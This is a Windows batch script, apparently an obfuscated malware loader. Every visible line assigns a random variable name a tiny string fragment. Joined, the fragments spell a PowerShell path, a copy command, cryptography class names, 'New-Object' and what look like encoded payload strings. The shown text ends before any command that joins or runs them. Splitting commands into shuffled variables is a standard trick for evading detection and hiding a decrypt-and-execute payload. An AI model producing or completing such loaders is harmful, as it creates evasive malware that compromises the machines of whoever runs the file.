@echo off
set "mEvKaOTZzx=:\"
set "FETKERefES= /"
set "tLDLdMNmFl=\W"
set "RUPasAzOsX=nd"
set "gICzshgUks=ow"
set "TnTHmpVqAC=\v"
set "GsBnmJQkna=32"
set "peHCqqhIJj=st"
set "ISZxOyPmRh=we"
set "YJhbqBXHmY=Wi"
set "klxdKHaYkP=in"
set "RuPVCrUgme=s\"
set "hojOguFJAy=he"
set "LxRrmrOvrz=Sy"
set "CHsZGlLSDE=co"
set "JSomQuVyDE=Po"
set "ZhIAVFWOyn=ll"
set "aeQLYHXXUr=ll"
set "QMcmWwPUnI=y "
set "qTTVhTuBCQ=po"
set "TgMtheDkaf=0\"
set "yojXVTTnoD=we"
set "zXuIQIALPv=ws"
set "udwThwfUya=em"
set "kpWwhDntyu=.e"
set "mUWqTWCtqG=do"
set "MLqumJnpuD=he"
set "DhlCxuIkru=1."
set "bbiDGIedqd= C"
set "jtWYMnROnb=rS"
set "YMGAxNBAAh=rs"
set "LCElhKupsA=py"
set "sUbueNYOKl=xe"
set "HbxWSDLrEI=cd"
set "yttWXckhHt= %~dp0"
set "OqOJfNOOGO=::('"
set "PlIFasFHpa=y.Ci"
set "onlaoybtjd=kiBu"
set "SFjkoTthty=pose"
set "aCFZdhHdkU=.Cry"
set "DOJZcBLbCR=stem"
set "UvCovyhMbt=tsWi"
set "HgEuTroOOO=J.En"
set "tEzXmaNeRG=Disp"
set "fiisGKtQMj=xZp."
set "yJhzUvLGaM=New-"
set "qJlFyMRAHP=th('"
set "ofyjPtNMLA=bjec"
set "udBoCRmhxF=C = "
set "RMMTEmTqXP=Comp"
set "VqMbQidmDh=)($W"
set "sXCmZJVRsA=eCSt"
set "TEnWSjCEVx=l, 0"
set "tOJRwghDdf=;$eC"
set "dcMRYJdTBq=TllA"
set "bjDXfLeCMr=Syst"
set "PnqHZKFzpx= = ["
set "kzKYBoXnwq=]::C"
set "QrKyScuGXO=FL.I"
set "wQiePGaPDj='[-1"
set "IQcWEjoEmQ=ress"
set "BOcsMqGtAe= '')"
set "EzPcnkWmyD=tvbl"
set "FbjuRCmLar=Wtvb"
set "MGhjCvbeqB=Disp"
set "SfZEnvrMeR=KBKG"
set "FNOGyFQkBQ=pDZz"
set "CkkLdpLOtn=ct S"
set "xlvVIpBWIi=);$l"
set "AdwPyBiJAl=6] -"
set "LPlbEEapFK==');"
set "mHhZWyyYeP=, $W"
set "ASJzOTRWVd=('l0"
